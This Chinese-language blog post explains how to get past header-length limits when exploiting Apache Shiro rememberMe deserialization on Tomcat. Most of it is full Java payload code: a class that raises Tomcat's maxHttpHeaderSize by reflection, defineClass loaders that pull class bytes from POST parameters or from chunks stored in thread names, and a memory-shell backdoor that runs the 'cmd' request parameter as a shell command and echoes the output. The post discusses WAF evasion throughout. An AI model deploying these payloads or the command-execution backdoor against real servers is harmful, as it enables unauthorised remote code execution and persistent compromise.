---
title: "Shiro反序列化突破长度限制"
onlyTitle: true
date: 2025-4-15 15:02:08
categories:
- java
- 框架漏洞
tags:
- Shiro
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8146.jpg
---



# Shiro反序列化突破长度限制

来源于hw面试官的问题，shiro rememberMe限制了Header长度怎么办

首先需要知道一下rememberMe长度限制的究竟是什么场景。一般来说，shiro注入是打CB链加载TemplatesImpl字节码。如果长度限制成1KB以下，是根本不可能绕过的。其次，shiro漏洞进行持久化和回显会尝试注入内存马，那么TemplatesImpl内存马就会比较大，所以缩短payload针对的场景是需要注入内存马或者回显的情况。如果目标存在出网shell，不需要打内存马的情况，本文就没有用处。

在Tomcat中对Header长度的限制，是通过配置org.apache.coyote.http11.AbstractHttp11Protocol#maxHttpHeaderSize来实现的，默认配置是8192字节，即8KB。下面是不同Tomcat版本的maxHttpHeaderSize：

```java
//Tomcat 8.0.47等
private int maxHttpHeaderSize = 8192;
//Tomcat 8.5.78、Tomcat 9.0.68等
private int maxHttpHeaderSize;
this.maxHttpHeaderSize = 8192;
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406180753779.png)

从根本上来说，第一个思路就是修改Tomcat maxHttpHeaderSize来绕过Tomcat限制

如果对header长度的限制不在Tomcat配置，而是在WAF上呢？

也就是第二个更加通用的手法，缩短payload

## 增大maxHttpHeaderSize 绕过Tomcat

在Http11Processor可以看到调用getMaxHttpHeaderSize生成inputBuffer和outputBuffer的过程

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406182529757.png)

由于每一次请求到达web服务，Tomcat都会创建一个线程来处理该请求

那怎么做到上次修改的buffer在下次请求有效？

### 调试

随便找一个servlet项目，在doGet or doPost打上断点

看到AbstractProtocol$ConnectionHandler#process，其中获取processor的逻辑，先从recycleProcessor.pop()获取，如果仍然为空则调用createProcessor

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406204516789.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406204429516.png)

跟进一下createProcessor，普通请求是调用AbstractHttp11Protocol#createProcessor，在该方法内调用了Http11Processor的构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406205552575.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406205627969.png)

Http11Processor构造函数先调用父类AbstractProcessor的构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406212455979.png)

AbstractProcessor构造函数new Request()，创建了org.apache.coyote.Request

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406212546084.png)

然后如上文所说去新建了inputBuffer和outputBuffer

再看到RecycledProcessors，有pop方法就肯定有push

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406211035600.png)

`AbstractProtocol$ConnectionHandler#release`调用了recycledProcessors.push

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406211512713.png)

在请求完成的时候，会调用release去暂时存储当前的processor

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406211953271.png)

如果从recycledProcessors.pop不为空，就不会调用createProcessor

如果recycledProcessors.pop为空，就会调用createProcessor去创建一个新的Http11Processor

接着看到StandardWrapperValve.invoke，调用了request.getRequest，这里request是上文创建的org.apache.coyote.Request

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406220729387.png)

跟进到getRequest，该方法有两个 if 判断：

- 第一个是判断facade是否为 null，不为null就new RequestFacade。
- 第二个是把facade赋值给applicationRequest对象，接着返回applicationRequest对象。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406220427302.png)

产生一个思考：在第二个if中可以直接返回facade，为什么要赋值给applicationRequest?

在CoyoteAdapter.service中，调用了request.recycle

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406221858873.png)

跟进到recycle内，直接把applicationRequest置为null，然后getDiscardFacades默认为false，也就是保留facade

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250406221811654.png)

因此下一次请求过来的时候，facede并不为空，直接复用facade，把facade赋值给applicationRequest。

因为每次请求对应的Endpoint都一样，所以每次请求都用的同一个processor，且一个RequestFacade对应一个processor，所以每次请求用的都是同一个RequestFacade。所以即使修改了inputBuffer、outputBuffer也用的原来的请求

**Tomcat 的 `Http11Processor` 是线程池中的复用对象**，多个请求可能会被分配给同一个 `Processor` 实例，尤其是在你快速连续请求、Tomcat 没有太大并发压力时。

对应的办法也很简单：

Tomcat 会为每个连接分配 Processor，从连接池中取或新建。所以**你可以并发发起多个请求**，迫使 Tomcat 创建多个 Processor

copy一手三梦师傅的Tomcat通用回显，遍历所有的processors，找到RequestGroupInfo中存储了RequestInfo的processors，然后修改maxHeaderSize

原理见：https://godownio.github.io/2025/02/26/tomcat-xia-huo-qu-standardcontext-de-fang-fa-jsp-zhuan-java-nei-cun-ma/#Tomcat%E7%9B%B4%E6%8E%A5%E5%86%99Response-2%EF%BC%88Tomcat8-9-10%E9%80%9A%E7%94%A8%EF%BC%89

注意这里payload制作出来已经达到了7800byte，还是在没有业务的情况下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250407132323697.png)

因为字符限制，我们不能反射获取resources，只能直接getResource，导致8.5.78及以上版本都很难使用

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

@SuppressWarnings("all")
public class TomcatHeaderSize extends AbstractTranslet {

    static {
        try {
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField("headerBufferSize");
            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
            contextField.setAccessible(true);
            headerSizeField.setAccessible(true);
            serviceField.setAccessible(true);
            requestField.setAccessible(true);
            getHandlerMethod.setAccessible(true);
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
            for (int i = 0; i < connectors.length; i++) {
                if (4 == connectors[i].getScheme().length()) {
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
                        for (int j = 0; j < classes.length; j++) {
                            // org.apache.coyote.AbstractProtocol$ConnectionHandler
                            if (52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())) {
                                java.lang.reflect.Field globalField = classes[j].getDeclaredField("global");
                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                                globalField.setAccessible(true);
                                processorsField.setAccessible(true);
                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler, null));
                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                                for (int k = 0; k < list.size(); k++) {
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));
                                    // 10000 为修改后的 headersize 
                                    headerSizeField.set(tempRequest.getInputBuffer(),40000);
                                }
                            }
                        }
                        // 10000 为修改后的 headersize 
                        ((org.apache.coyote.http11.AbstractHttp11Protocol) protocolHandler).setMaxHttpHeaderSize(40000);
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

然后打内存马，但是我并没有复现成功，也许我的并发量太小了

payload可以被进一步缩短，在这不再叙述

但这始终不是一个优雅的方法，存在着许多缺点：

1. 并发并不能稳定触发创建新的processor，且爆破流量会被超级多的waf拦截
2. 初始包就接近Tomcat的size上限，如果业务导致请求包本身较大，会导致超过size限制
3. 对header长度的限制不在Tomcat配置，而是在WAF上，则直接无法bypass

所以跳过这个姿势的复现吧！

## defineClass POST

当目标无WAF或者WAF仅针对HTTP Header时，可以用defineClass加载POST参数。POST参数的长度肯定不算在Header里面

```java
			String classData=request.getParameter("classData");
            byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(MyLoader.class.getClassLoader(), classBytes, 0,classBytes.length);
```

然后获取request的方法选择线程的方式获取（spring环境能直接从ClassLoader获取），这样初始字节码整体会短一些

线程方式构造回显见：https://godownio.github.io/2025/04/09/li-yong-java-object-searcher-gou-jian-tomcat-xian-cheng-hui-xian/

用的是这个链子：

```java
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> global = {org.apache.coyote.RequestGroupInfo} 
           ---> processors = {java.util.ArrayList<org.apache.coyote.RequestInfo>} 
            ---> [0] = {org.apache.coyote.RequestInfo}
```

```java
package org.exploit.third.shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Iterator;

public class ShiroEvilLoader extends AbstractTranslet {
    public ShiroEvilLoader() {
        try {
            Object jioEndPoint = GetAcceptorThread();
            Object object = getField(getField(jioEndPoint, "handler"), "global");
            ArrayList processors = (ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();
                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)) {
                    continue;
                }
                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) ((org.apache.coyote.Request) req).getNote(1);
                //获取请求中的classData参数的值
                String bs64_data = request.getParameter("classData");
                if(bs64_data != null){
                    byte[] bytes = Base64.getDecoder().decode(bs64_data);
                    java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                    defineClassMethod.setAccessible(true);
                    Class clazz = (Class) defineClassMethod.invoke(ShiroEvilLoader.class.getClassLoader(), bytes, 0, bytes.length);
                    clazz.newInstance();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    //获取属性
    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException e) {
            } catch (IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    //获取Acceptor线程
    public static Object GetAcceptorThread() {
        //获取当前所有线程
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null || thread.getName().contains("exec")) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                Object jioEndPoint = null;
                try { //Tomcat678
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {//Tomcat9
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        continue;
                    }
                }
                return jioEndPoint;
            }
        }
        return null;
    }

}
```

上述代码是完成一个加载classData传入的类并调用其无参构造函数

classData参数打内存马，适用于shiro的都可以。这里依旧简单的打个回显即可

```java
package org.exploit.third.shiro;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.loader.WebappClassLoaderBase;

import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

//1. getContextClassLoader()->resources->getContext()先获取StandardContext。然后StandardContext->context(ApplicationContext)->service(StandardService)可以获取到StandardService。
//2. 从StandardService->connectors->Connector的路径取出connector。connector内部有protocolHandler字段，存储着Http11NioProtocol
//3. 获取到了Http11NioProtocol，才能调用其父类AbstractHttp11Protocol的getHandler或者反射 去获取AbstractHttp11Protocol构造函数所创建的`AbstarctProtocol$ConnectionHandler`。以上都是因为ConnectionHandler是个内部类带来的麻烦事
//4. 获取到了ConnectionHandler，就可以反射获取global静态字段，global实际上是RequestGroupInfo，可以按照RequestGroupInfo->RequestInfo->Request的方式获取到Request
//通用tomcat 8 9 10
public class GenericTomcatMemShell2 {

    public static void main(String[] args) throws IOException {
        byte[] string = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("target/classes/org/exploit/third/shiro/GenericTomcatMemShell2.class")));
        System.out.println(new String(string));
    }
    public GenericTomcatMemShell2() {
        try {
            //传递的参数，后门标识
            String pass = "cmd";

            //获取WebappClassLoaderBase
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();

            //获取ApplicationContext
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(StandardContext);

            //获取StandardService
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            serviceField.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);

            //获取Connector
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();

            //找到指定的Connector
            for (int i = 0; i < connectors.length; i++) {
                if (connectors[i].getScheme().contains("http")) {
                    //获取protocolHandler、connectionHandler
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                    getHandlerMethod.setAccessible(true);
                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);

                    //获取RequestGroupInfo
                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler);

                    //获取RequestGroupInfo中储存了RequestInfo的processors
                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                    for (int k = 0; k < list.size(); k++) {
                        org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
                        if (requestInfo.getCurrentQueryString().contains(pass)) {
                            //获取request
                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                            requestField.setAccessible(true);
                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                            //执行命令
                            String cmd = request.getParameter(pass);
                            if (cmd != null) {
                                String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                                String output = s.hasNext() ? s.next() : "";
                                //回显
                                java.io.Writer writer = request.getResponse().getWriter();
                                java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                                usingWriter.setAccessible(true);
                                usingWriter.set(request.getResponse(), Boolean.FALSE);
                                writer.write(output);
                                writer.flush();
                            }
                            break;
                        }
                        break;
                    }
                    break;
                }
            }
        }
        catch (Exception e) {
        }
    }
}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250414220416523.png)

提一嘴，如果你的payload报BeanComparator不兼容，可能是你的payload用的mashalsec哦!另外，POST体需要URL编码，而cookie不需要

## 分散发包

Y4takcer，膜膜膜

采用以下流程，用线程名来存储base64字节码：

1. 先`Thread.currentThread().setName("Qwzf");`设置一个具有特征的线程名
2. 分块发包，把每个块的内容添加到线程名中
3. defineClass加载线程名

太有思路了哥，直接copy！改都不用改

```java
public class ThreadName extends AbstractTranslet {
    public ThreadName() throws Exception{
        //Thread.currentThread().setName("Qwzf");
        ThreadGroup a = Thread.currentThread().getThreadGroup();
        java.lang.reflect.Field v2 = a.getClass().getDeclaredField("threads");
        v2.setAccessible(true);
        Thread[] o = (Thread[]) v2.get(a);
        for(int i = 0; i < o.length; ++i) {
            Thread z = o[i];
            //在具有Qwzf标识的Thread name后添加Payload
            if (z.getName().contains("Qwzf")){
                //将Payload分成多段加入，Payload1、Payload2......
                String Payload1 = "";
                //String Payload2 = "";
                //String Payload3 = "";
                //String Payload4 = "";

                z.setName(z.getName()+Payload1);
            }
         }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

```java
public class Loader extends AbstractTranslet{
    public Loader() throws Exception{
        ThreadGroup a = Thread.currentThread().getThreadGroup();
        Field v2 = a.getClass().getDeclaredField("threads");
        v2.setAccessible(true);
        Thread[] o = (Thread[]) v2.get(a);
        for (int i = 0; i < o.length; ++i) {
            Thread z = o[i];
            //使用ClassLoader类的defineClass方法加载具有Qwzf标识的Thread name中的Payload
            if (z.getName().contains("Qwzf")) {
                byte[] bytes2 = new sun.misc.BASE64Decoder().decodeBuffer(z.getName().replaceAll("Qwzf", ""));
                //反射获取ClassLoader类的defineClass方法
                java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                defineClassMethod.setAccessible(true);
                //反射调用defineClass方法加载Thread name中的注入内存马的类字节码
                Class clazz = (Class) defineClassMethod.invoke(Loader.class.getClassLoader(), bytes2, 0, bytes2.length);
                clazz.newInstance();
            }
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```



另外还有一个Gzip解压后defineClass加载，但是那么大的Gzip字符串没什么鸟用。





ref：

https://www.qwzf.top/2023/02/21/浅析Shiro反序列化Payload长度绕过/

https://cloud.tencent.com/developer/article/1475881

https://www.jianshu.com/p/ab054620da64

https://zhuanlan.zhihu.com/p/548516726

https://blog.csdn.net/qq_25179481/article/details/104464842

https://mp.weixin.qq.com/s/QJgAt2usAZ7xYxTo0kXZ7A

https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw

https://mp.weixin.qq.com/s/r32pX7ucl-X9JoXzAzIRmw

[https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/](https://y4tacker.github.io/2022/04/14/year/2022/4/浅谈Shiro550受Tomcat-Header长度限制影响突破/)

https://paper.seebug.org/1233/